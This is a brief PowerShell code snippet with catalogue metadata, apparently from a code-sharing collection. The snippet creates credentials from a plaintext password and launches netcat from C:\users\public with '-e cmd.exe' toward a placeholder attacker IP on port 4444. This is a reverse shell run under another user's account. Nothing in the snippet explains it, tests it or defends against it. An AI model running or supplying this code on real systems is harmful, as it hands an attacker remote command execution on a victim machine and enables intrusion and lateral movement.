---
id: f89ee0da-e940-46f5-8186-e7a21303c273
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:29.950116+00:00'
updated_at: '2023-04-10T20:37:41.384042+00:00'
---

# Code Snippet f89ee0da

**Language**: Powershell

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```


